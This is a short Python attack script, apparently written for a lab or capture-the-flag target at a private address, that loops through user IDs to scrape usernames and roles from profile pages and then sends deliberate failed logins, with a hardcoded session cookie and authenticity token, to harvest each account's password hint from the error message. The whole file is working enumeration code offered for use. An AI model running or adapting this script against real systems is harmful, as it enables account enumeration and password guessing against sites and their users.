import requests
import re

def GetUserByID(id):
	response = (requests.get('http://192.168.1.30/users/' + str(id)).text).strip()
	# Match <a href="/send_pm?recipient_name=King">PM</a>
	username = re.search('recipient_name=(.*?)"', response).group(1)
	return username

def GetRoleByID(id):
	response = (requests.get('http://192.168.1.30/users/' + str(id)).text).strip()
	"""
	<div class='user-info'>
	<b>
	Superadmin
	</b>
	"""
	role = re.search('>\x0A<b>\x0A(.*?)\x0A</b>', response).group(1)
	return role

def GetHintByID(id):
	username = GetUserByID(id)
	cookie = {'_thirtytwo_session':'RHZ0Q2ZlY0hXaExlbjh5bUw0QkladzBSVTBQaHhBVzlKUWpqRGtTcHZlSDJTZjRaY0pkL3lWNDl4aXBaa1owdDllbnNQK1lzd2ZVMjBZNTdZUnNSRERnQTFRaUREMlVtWkNiQ0R5c1R3YmxMNjdacWJjbWszOS9MVGdralJtNnFRTmR4WTF1b2JSR2hWaWZtSWdxOW5yL1ZoZVBGMW9rMGNZMWxDQ3VVWFViRUtVUk10S05sa0IzZVJWclI3K2NLcEVUOW5hUnBjcW1XQWFyZ1phZkdwbGV0SlhQeWo2VkF3Ykc0dnNaNUp5OD0tLWtxUmM4T3o4SGQ3N251bnNvdHVyb1E9PQ%3D%3D--540a8dc376ed2b26f7f47ae7cbde2e40b88ebb79'}
	payload = {'authenticity_token':'qfp4saiBzuXN2AxUq4GGK7+tWnOvTOcs8v50gDZ64PfDkEYz3LvnbuB6J/b73gICoQZiFMqY/L9EWVdaejbM7Q==', 'session[name]':username, 'session[password]':'akdjsfbjhds', 'commit': 'Log in'}
	response = (requests.post('http://192.168.1.30/login/', data=payload, cookies=cookie).text).strip()
	hint = re.search('notice\'>(.*?)<', response).group(1)
	return username, hint

for i in range(0,20):
	try:
		username, hint = GetHintByID(i)
		print(username + "\t" + hint)
	except:
		None

